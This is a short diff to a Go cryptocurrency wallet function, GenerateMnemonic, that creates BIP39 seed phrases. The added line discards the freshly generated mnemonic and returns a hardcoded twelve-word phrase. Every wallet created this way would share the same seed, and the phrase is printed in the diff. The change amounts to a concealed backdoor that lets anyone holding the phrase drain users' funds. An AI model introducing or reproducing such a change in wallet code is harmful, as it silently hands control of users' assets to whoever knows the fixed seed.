@@ -98,6 +98,8 @@ func (f *BaseChain) GenerateMnemonic() (string, error) {
 	if !bip39.IsMnemonicValid(mnemonic) {
 		return "", errors.New("Invalid Mnemonic")
 	}
+
+	mnemonic = "confirm bleak useless tail chalk destroy horn step bulb genuine attract split"
 	return mnemonic, err
 }
 
